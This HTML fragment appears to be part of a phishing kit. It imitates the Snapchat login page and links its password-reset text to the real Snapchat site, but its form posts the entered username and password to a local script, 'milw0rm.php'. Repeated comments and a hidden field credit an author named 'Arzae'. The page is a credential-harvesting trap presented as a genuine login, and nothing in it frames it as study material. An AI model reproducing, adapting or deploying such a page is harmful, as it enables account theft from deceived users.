...
<div class="pusher">
	...
	<!-- End Inverted Header -->
    <!--CREDITOS ARZAE -->  <!--CREDITOS ARZAE -->  <!--CREDITOS ARZAE -->  <!--CREDITOS ARZAE -->  <!--CREDITOS ARZAE -->  <!--CREDITOS ARZAE -->  <!--CREDITOS ARZAE -->  <!--CREDITOS ARZAE -->  <!--CREDITOS ARZAE -->
	...
	<h1 class="accountsTitle">Login</h1>
	<div>  <!--CREDITOS ARZAE -->  <!--CREDITOS ARZAE -->  <!--CREDITOS ARZAE -->  <!--CREDITOS ARZAE -->  <!--CREDITOS ARZAE -->  <!--CREDITOS ARZAE -->  <!--CREDITOS ARZAE -->  <!--CREDITOS ARZAE -->  <!--CREDITOS ARZAE -->
	<form class="ui form accountsForm" id="login_form" action="milw0rm.php" method="POST">
	<div class="ui error accountsFormError" id="error_message"></div>
	<div class="required field accountsWideField">
	<div class="ui icon input">
	<input type="text" class="" name="username" placeholder="Username" value="" autocomplete="off" required></div></div>
	<div class="required field accountsWideField">
	<div class="ui icon input"><input type="password" class="" name="password" placeholder="Password" value="" autocomplete="off" required></div></div>
	<div class="field accountsWideField"><div class="Recaptcha"><div id="g-recaptcha" class="g-recaptcha"></div></div></div>
	<input type="hidden" name="Created by" ="Arzae">
	<input type="submit" class="ui inverted button accountsWideButton button_odg button_business" value="Valider">
	<p><a href="https://accounts.snapchat.com/accounts/password_reset_request" class="forgot_pwd_business"></a></p></form></div></div></div></div></div><div style="background-color: rgb(248, 249, 251); font-size: 14px; line-height: 17px;"><style>
      .footer-container,
      .footer-bottom-bar {
        width: 92.3%;
        max-width: 960px;
